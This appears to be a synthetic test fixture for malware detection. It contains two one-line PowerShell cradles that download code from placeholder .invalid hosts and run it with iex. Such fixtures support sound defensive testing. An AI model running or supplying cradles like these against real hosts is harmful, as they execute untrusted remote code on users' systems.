# FIXTURE ONLY - synthetic detection test sample, not real malware.
# Two one-line PowerShell download-and-execute cradles. Endpoints are .invalid.
Invoke-WebRequest "https://stage.fixture.invalid/s" | iex
iex (irm "https://stage.fixture.invalid/p")
